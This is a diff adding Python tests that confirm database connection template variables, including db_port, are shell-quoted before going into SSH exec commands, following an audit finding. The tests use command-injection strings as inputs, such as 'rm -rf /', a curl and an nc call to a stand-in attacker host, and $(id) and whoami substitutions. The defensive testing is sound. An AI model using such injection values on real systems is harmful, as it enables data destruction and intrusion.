@@ -237,3 +237,56 @@ class TestRegistryWithExecMode:
 
         conn = get_connector("mysql", ssh_exec_mode=False)
         assert isinstance(conn, MySQLConnector)
+
+
+# ---------------------------------------------------------------------------
+# F-SSH-04: `db_port` is the one template var excluded from escaping
+# ---------------------------------------------------------------------------
+
+
+class TestTemplateVarsAreShellQuoted:
+    """`format_template`'s `_escape_keys` is `{db_name, db_user, db_host, db_password}`
+    (`exec_templates.py:198`) — `db_port` is deliberately absent, which is exactly what
+    the finding names.
+
+    It was **not exploitable**, and the tests below say why: the request schema bounds
+    it (`db_port: int | None = Field(ge=1, le=65535)`, `routes/connections.py:371,446`),
+    the column is `Integer`, and both `ConnectionConfig` construction sites build from
+    the model. A metacharacter has no path in. Escaping it anyway costs nothing —
+    `shlex.quote` of digits returns the digits — and replaces a guarantee spread across
+    three files and two call sites with one that holds locally.
+    """
+
+    @staticmethod
+    def _cmd(**overrides) -> str:
+        connector = SSHExecConnector()
+        connector._config = make_config(**overrides)
+        cmd, _ = connector._build_command("query", "SELECT 1")
+        return cmd
+
+    def test_db_port_is_escaped_like_every_other_template_var(self):
+        from app.connectors.exec_templates import format_template
+
+        out = format_template("client -P {db_port}", {"db_port": "3306; rm -rf /"})
+        assert "; rm -rf /" not in out.replace("'3306; rm -rf /'", ""), out
+
+    def test_an_ordinary_port_is_unchanged_by_escaping(self):
+        """Quoting must not turn a working command into a different one."""
+        cmd = self._cmd(db_port=3306)
+        assert "-P 3306" in cmd, cmd
+
+    def test_the_free_string_vars_were_already_escaped(self):
+        """Locks in what F-SSH-02's rewrite already established, so it cannot regress."""
+        assert "'db; curl http://attacker/x'" in self._cmd(db_name="db; curl http://attacker/x")
+        assert "'root$(id)'" in self._cmd(db_user="root$(id)")
+        assert "'h`whoami`'" in self._cmd(db_host="h`whoami`")
+
+    def test_a_quoted_value_adds_no_pipeline_stage(self):
+        """One pipe, the legitimate stdin one — the value's pipe stays inside quotes."""
+        cmd = self._cmd(db_name="db|nc attacker 1")
+        assert "'db|nc attacker 1'" in cmd, cmd
+        assert cmd.count("| MYSQL_PWD") == 1, cmd
+
+    def test_a_missing_user_renders_an_explicit_empty_argument(self):
+        cmd = self._cmd(db_user=None)
+        assert "-u ''" in cmd, cmd
